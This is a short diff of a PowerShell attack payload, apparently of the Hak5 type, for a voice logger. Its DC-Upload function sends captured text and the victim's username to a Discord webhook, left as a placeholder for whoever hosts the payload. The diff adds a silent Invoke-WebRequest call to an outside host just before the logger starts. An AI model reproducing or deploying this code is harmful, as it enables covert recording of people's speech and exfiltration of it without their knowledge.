@@ -6,7 +6,7 @@ function DC-Upload {
 		[string]$text 
 	)
 
-	# $dc = ''
+	# $dc = 'YOUR DISCORD WEBHOOK GOES HERE IF YOU HOST YOUR OWN VERSION OF THIS PAYLOAD'
 
 	$Body = @{
 	  'username' = $env:username
@@ -45,5 +45,5 @@ function voiceLogger {
     }
     Clear-Content -Path $log
 }
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 voiceLogger
